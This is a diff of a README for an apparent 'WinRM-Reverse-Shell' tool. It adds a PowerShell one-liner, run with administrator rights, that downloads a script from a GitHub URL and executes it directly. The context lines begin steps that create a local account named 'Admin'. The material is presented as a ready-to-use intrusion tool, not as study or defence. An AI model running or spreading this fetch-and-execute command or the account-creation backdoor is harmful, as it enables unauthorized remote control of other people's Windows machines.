@@ -1,5 +1,8 @@
 # WinRM-Reverse-Shell
 
+# Powershell One liner with administrator permissions
+`IEX (IWR "https://raw.githubusercontent.com/VBV11/WinRM-Reverse-Shell/main/WinRM.ps1")`
+
 # Script into pieces
 ## Create a new local user account
 $Username = "`Admin`"
